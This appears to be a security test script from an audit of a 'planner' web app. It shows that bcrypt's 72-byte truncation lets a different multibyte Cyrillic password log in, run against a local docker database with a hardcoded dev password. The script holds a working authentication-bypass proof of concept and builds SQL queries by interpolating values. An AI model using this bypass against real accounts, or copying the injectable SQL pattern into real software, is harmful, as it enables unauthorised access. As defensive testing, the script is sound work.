// §9: password length limit is in CHARACTERS (<=72) but bcrypt truncates at 72 BYTES.
// 72 Cyrillic letters = 144 bytes -> only first ~36 chars matter. Two long Cyrillic
// passwords sharing a 36-char prefix authenticate interchangeably.
import { api } from '../_lib/provision.mjs'
import { execFileSync } from 'node:child_process'
const sql = (q) => execFileSync('docker', ['exec', 'planner-mysql', 'mysql', '-N', '-uplanner', '-pplanner_dev_password', 'planner', '-e', q], { encoding: 'utf8' }).trim()
const readCode = (e) => sql(`SELECT Code FROM EmailVerificationCodes WHERE Email='${e}' AND IsUsed=0 ORDER BY Id DESC LIMIT 1;`).split(/\s+/).pop()

const e = 'adv.t01.bcrypt@gmail.com'
sql(`DELETE FROM EmailVerificationCodes WHERE Email='${e}';`); sql(`DELETE FROM UserProfiles WHERE UserId IN (SELECT Id FROM Users WHERE Email='${e}');`); sql(`DELETE FROM Users WHERE Email='${e}';`)

const prefix = 'а'.repeat(36)                 // 36 Cyrillic 'а' = 72 bytes
const regPassword = prefix + 'ХХХХ'           // register with this (40 chars, 80 bytes)
const loginPassword = prefix + 'ZZZZ'          // different tail, same 72-byte prefix

console.log(`[info] register password bytes = ${Buffer.byteLength(regPassword, 'utf8')}, char len = ${regPassword.length}`)
await api('POST', '/api/auth/send-code', { body: { email: e, nickname: 'Bc' } })
const code = readCode(e)
const reg = await api('POST', '/api/auth/register', { body: { nickname: 'Bc', gender: 'female', email: e, code, password: regPassword, studentType: 'none', isWorking: false } })
console.log(`[setup] registered with 40-char (80-byte) Cyrillic password -> ${reg.status}`)

const login = await api('POST', '/api/auth/login', { body: { email: e, password: loginPassword } })
console.log(`[attack] login with a DIFFERENT password that shares the first 72 bytes -> ${login.status} ${login.text.slice(0,80)}`)
console.log(login.status === 200
  ? `CONFIRMED: a different password (same 72-byte prefix) logs in successfully. bcrypt's 72-BYTE truncation means multibyte passwords collide beyond ~36 Cyrillic chars; the char-based >72 guard does not prevent it.`
  : `NOT CONFIRMED (status=${login.status})`)
